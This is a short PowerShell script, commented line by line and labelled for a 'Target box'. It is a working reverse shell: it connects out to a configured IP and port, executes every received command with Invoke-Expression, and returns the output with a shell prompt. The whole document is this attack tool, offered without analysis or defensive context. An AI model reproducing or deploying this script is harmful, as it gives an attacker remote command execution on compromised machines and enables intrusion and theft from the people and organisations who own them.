#this is a powershell - Server - Target box
# Define the IP address and port number for the server
$ip = "127.0.0.1"
$port = 8080

# Create a new TCP client and connect to the server
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)

# Get the stream from the client
$stream = $client.GetStream()

# Create an array of bytes to store data received from the server
[byte[]]$bytes = 0..65535|%{0}

# Loop until the stream is closed
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
  # Convert the received bytes to a string
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)

  # Execute the received command and store the output
  $sendback = (iex $data 2>&1 | Out-String )

  # Append the current working directory to the output
  $sendback2 = $sendback + "PS " + (pwd).Path + "> "

  # Convert the output string to an array of bytes
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)

  # Write the bytes to the stream and flush the stream
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}

# Close the client and stream when the loop is finished
$client.Close()
